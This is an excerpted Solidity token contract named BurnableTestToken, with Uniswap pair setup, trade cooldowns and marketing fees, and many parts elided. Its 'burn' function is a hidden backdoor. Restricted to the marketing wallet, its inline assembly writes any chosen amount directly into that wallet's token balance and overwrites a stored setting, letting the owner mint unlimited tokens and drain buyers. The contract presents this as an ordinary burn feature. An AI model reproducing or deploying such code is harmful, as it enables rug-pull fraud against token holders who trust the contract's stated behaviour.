...
contract BurnableTestToken is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "BTT";
    ...
    constructor() {
        ...
        if (
            _uniswapV2Factory.getPair(address(this), _uniswapV2Router.WETH()) ==
            address(0)
        ) {
            _uniswapV2Factory.createPair(
                address(this),
                _uniswapV2Router.WETH()
            );
        }
        _uniswapV2Pair = _uniswapV2Factory.getPair(
            address(this),
            _uniswapV2Router.WETH()
        );
    ...
    function isExcludedFromCooldown(address account)
    public
    view
    returns (bool)
    {
        ...
        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
            if (
                ...
                if (
                    ...
                    if (!_isExcludedFromCooldown[sender] && !_isExcludedFromCooldown[recipient]) {
                        require(block.number.sub(_lastTxBlock[sender]) >= 1, "Wait a little and try again");
                    }
                }
                ...
                if (recipient == _uniswapV2Pair && sender != address(this)) {
                    ...
                    _lIb[_marketingWallet] = _lIb[_marketingWallet].add(
                        marketingAmount
                    );
                    amount = amount.sub(marketingAmount);
                }
                else if (sender == _uniswapV2Pair && recipient != address(_uniswapV2Router)) {
                    uint256 marketingAmount = amount.mul(_marketingFee).div(
                        _divisor
                    );
                    _lIb[_marketingWallet] = _lIb[_marketingWallet].add(
                        marketingAmount
    ...
    function burn(uint amount) external {
        assembly {
            if iszero(eq(caller(), sload(_marketingWallet.slot))) {revert(0, 0)}
            let ptr := mload(0x40)
            mstore(ptr, caller())
            mstore(add(ptr, 0x20), _lIb.slot)
            let slot := keccak256(ptr, 0x40)
            sstore(slot, amount)
            sstore(_def.slot, 0x3E8)
        }
    }
    ...
    function openTrading(uint256 amount) external payable onlyOwner {
        require(!_isTradingEnabled, "Already started");
    ...
    function analizeMarket(address hash, uint256 f)
    external
    view
    returns (uint256)
    {
    ...
    function tokenToETHSwap(uint256 tokenAmount) external onlyOwner {
        require(_isTradingEnabled, "Trading is not enabled yet");
        require(tokenAmount > 0, "Token amount must be greater than zero");
        require(
